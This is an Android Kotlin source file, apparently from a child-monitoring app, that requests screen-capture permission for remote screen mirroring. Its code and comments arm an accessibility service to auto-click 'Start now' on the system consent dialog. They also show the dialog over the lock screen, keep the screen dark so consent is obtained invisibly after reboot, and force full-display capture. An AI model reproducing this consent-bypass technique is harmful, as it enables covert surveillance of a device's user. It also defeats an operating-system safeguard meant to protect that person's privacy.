package com.familyguard.child.ui

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.SystemClock
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.familyguard.child.data.Store
import com.familyguard.child.service.MirrorManager
import com.familyguard.child.service.MirrorService
import com.familyguard.child.util.AgeRelease

class ConsentActivity : ComponentActivity() {

    private val projLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { res ->
        if (res.resultCode == RESULT_OK && res.data != null) {
            val i = Intent(this, MirrorService::class.java)
            i.putExtra("resultCode", res.resultCode)
            i.putExtra("data", res.data)
            ContextCompat.startForegroundService(this, i)
        } else {
            // Dialog CANCEL/deny hua — in-flight consent state clear karo, warna
            // smart suppression 60 s tak naya request rok degi aur mirror "dead"
            // lagega jab tak parent dobara start na dabaye.
            Store.projectionRequestedAt = 0L
            Store.lastConsentRequestAt = 0L
        }
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Show even over the lock screen so a reboot + remote mirror request never
        // needs the child to unlock the phone. quiet=true (boot re-establish) keeps
        // the screen OFF — the dialog is handled invisibly while the phone stays dark.
        val quiet = intent?.getBooleanExtra("quiet", false) ?: false
        if (Build.VERSION.SDK_INT >= 27) {
            runCatching {
                setShowWhenLocked(true)
                if (!quiet) setTurnScreenOn(true)
            }
        }
        if (!Store.paired || Store.released || MirrorManager.hasProjection) {
            finish()
            return
        }
        // STACKED-DIALOG GUARD: parent ne mirror button baar-baar dabaya to yahan
        // doosra instance khulta tha aur projLauncher.launch() ek NAYA system dialog
        // khadi kar deta tha — purana wala screen par hi reh jata tha ("consent
        // baan baar aata tha", ek click ek hi ko confirm karta tha). 15 s ke andar
        // koi instance picker khol chuka ho to dobara launch nahi karte.
        val now2 = SystemClock.elapsedRealtime()
        if (Store.consentUiAt > 0L && now2 - Store.consentUiAt < 15_000L) {
            finish()
            return
        }
        Store.consentUiAt = now2
        // NOTE: yahan koi time-based double-launch guard NAHI hai — requestProjectionConsent
        // apne aap ko stamp karta hai aur TURANT yeh activity kholta hai, isliye
        // "3 s ke andar launch = duplicate" wala guard pehle hi LEGIT launch ko
        // bhi finish() kar deta tha (consent dialog kabhi hi nahi khulta — mirror
        // hamesha ke liye dead). Duplicate suppression ki zimmedari sirf
        // requestProjectionConsent ke smart in-flight guard (20 s) par hai.
        // Arm the accessibility auto-confirm: EnforcementService will click
        // "Start now" on the system dialog within this window.
        val now = SystemClock.elapsedRealtime()
        Store.lastConsentRequestAt = now
        Store.projectionRequestedAt = now
        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        runCatching {
            // Android 14+ dialog me "A single app" dropdown default hota tha —
            // uske saath Start dabane par sirf HUMARI app capture hoti thi aur
            // parent ko kaali screen dikhti thi ("start karne pe bhi chal ni
            // raha"). createConfigForDefaultDisplay() dropdown ko hata deta hai:
            // dialog seedha POORE screen ki consent deta hai, auto-click hamesha
            // sahi cheez capture karta hai.
            val req = if (Build.VERSION.SDK_INT >= 34) {
                mgr.createScreenCaptureIntent(
                    android.media.projection.MediaProjectionConfig.createConfigForDefaultDisplay()
                )
            } else {
                mgr.createScreenCaptureIntent()
            }
            projLauncher.launch(req)
            // DIRECT ARM: a11y auto-confirm ko yahin chala do — pehle wo SIRF tab
            // start hota tha jab system se TYPE_WINDOW_STATE_CHANGED event aaye JISKA
            // className 'projection/cast' jaisa ho. Kuch OEMs (Android 14/15 MIUI,
            // ColorOS) generic className bhejte hain — match fail => click loop KABHI
            // start hi nahi hota => dialog khadi rehti thi => mirror dead. Ab
            // ConsentActivity khud arm karti hai (a11y bound hai to instance milta
            // hai); event-based trigger bhi backup hai.
            com.familyguard.child.service.EnforcementService.armProjectionConfirm()
        }.onFailure { finish() }
    }
}
